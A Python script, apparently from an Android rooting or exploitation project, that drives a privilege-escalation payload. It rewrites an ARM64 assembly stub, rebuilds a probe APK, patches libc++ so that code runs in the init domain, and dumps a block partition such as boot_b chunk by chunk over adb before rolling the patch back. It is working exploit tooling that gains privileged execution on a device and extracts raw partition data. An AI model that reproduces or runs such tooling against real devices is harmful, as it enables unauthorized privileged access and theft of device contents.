"""Dump one block partition in 8 MiB chunks through the init-domain payload.

Usage: python dump_partition.py <by-name> <out-prefix> [max-chunks]

Renders 25-kernel-dump-20261025/stub_template.S with the source path and seek
offset, rebuilds the probe APK, patches libc++, waits for init to run the
payload, pulls /metadata/cur.bin, then rolls back. Stops when a chunk is short.
"""
from __future__ import annotations

import re
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
PROBE = ROOT / "21-dirtyfrag-probe-20261025"
STUB = PROBE / "probe-src" / "app" / "src" / "main" / "cpp" / "stub.S"
TEMPLATE = ROOT / "25-kernel-dump-20261025" / "stub_template.S"
ADB = r"C:\Users\ASUS Vivobook\platform-tools\adb.exe"

CHUNK = 8 * 1024 * 1024


def run(cmd, **kw):
    return subprocess.run(cmd, capture_output=True, text=True, **kw)


def render(index: int, source: str, offset: int, size: int) -> str:
    text = TEMPLATE.read_text(encoding="utf-8")
    text = text.replace("@@LOCK@@", f"/dev/p780_part{index}")
    text = text.replace("@@OUT@@", "/metadata/cur.bin")
    text = text.replace("@@SIZE@@", "/metadata/cur.size")
    text = text.replace('.asciz  "/dev/block/by-name/boot_b"', f'.asciz  "{source}"')
    lo = offset & 0xFFFF
    hi = (offset >> 16) & 0xFFFF
    seek = (
        "    mov     x0, x13\n"
        f"    movz    x1, #{lo}\n"
        f"    movk    x1, #{hi}, lsl #16\n"
        "    mov     x2, #0\n"
        "    mov     x8, #62\n"
        "    svc     #0\n"
    )
    text = text.replace("    /* @@SEEK@@ */\n", seek)
    lo = size & 0xFFFF
    hi = (size >> 16) & 0xFFFF
    text = text.replace("    /* @@LIMIT@@ */\n",
                        f"    movz    x2, #{lo}\n    movk    x2, #{hi}, lsl #16\n")
    return text


def main() -> None:
    source = sys.argv[1]
    prefix = sys.argv[2]
    max_chunks = int(sys.argv[3]) if len(sys.argv) > 3 else 16
    start = int(sys.argv[4], 0) if len(sys.argv) > 4 else 0
    outdir = ROOT / "48-init-capability-20261025" / "partitions"
    outdir.mkdir(parents=True, exist_ok=True)
    src = f"/dev/block/by-name/{source}"

    total = 0
    for index in range(max_chunks):
        offset = start + index * CHUNK
        print(f"=== chunk {index}: offset {offset:#x} ===", flush=True)
        STUB.write_text(render(index, src, offset, CHUNK), encoding="utf-8")
        for step in (["build_patch.py", "libcxx"], ["gen_patchdata.py"], ["build_apk.py"]):
            r = run([sys.executable, str(PROBE / step[0])] + step[1:], cwd=str(PROBE))
            if r.returncode != 0:
                print(r.stdout[-500:], r.stderr[-500:])
                sys.exit(f"step failed: {step[0]}")
        run([ADB, "install", "-r", str(PROBE / "app-debug.apk")])
        run([ADB, "shell", "am", "force-stop", "top.dcmqht.p780ipsec"])
        run([ADB, "shell", "am", "start", "-n",
             "top.dcmqht.p780ipsec/.MainActivity", "-e", "probe", "patch"])
        # wait for the init payload to write the chunk
        got = None
        for _ in range(20):
            subprocess.run(["powershell", "-NoProfile", "-Command", "Start-Sleep -Seconds 2"])
            out = outdir / f"{prefix}.{index:02d}.bin"
            if out.exists():
                out.unlink()
            run([ADB, "pull", "/metadata/cur.bin", str(out)])
            if out.exists() and out.stat().st_size > 0:
                got = out
                break
        run([ADB, "shell", "am", "force-stop", "top.dcmqht.p780ipsec"])
        run([ADB, "shell", "am", "start", "-n",
             "top.dcmqht.p780ipsec/.MainActivity", "-e", "probe", "unpatch"])
        subprocess.run(["powershell", "-NoProfile", "-Command", "Start-Sleep -Seconds 3"])
        if got is None:
            print("  no chunk (gate miss)", flush=True)
            sys.exit(2)
        size = got.stat().st_size
        total += size
        print(f"  got {got.name}: {size} bytes (total {total})", flush=True)
        if size < CHUNK:
            print("  short chunk -> end of partition", flush=True)
            break
    print(f"done, total {total} bytes")


if __name__ == "__main__":
    main()
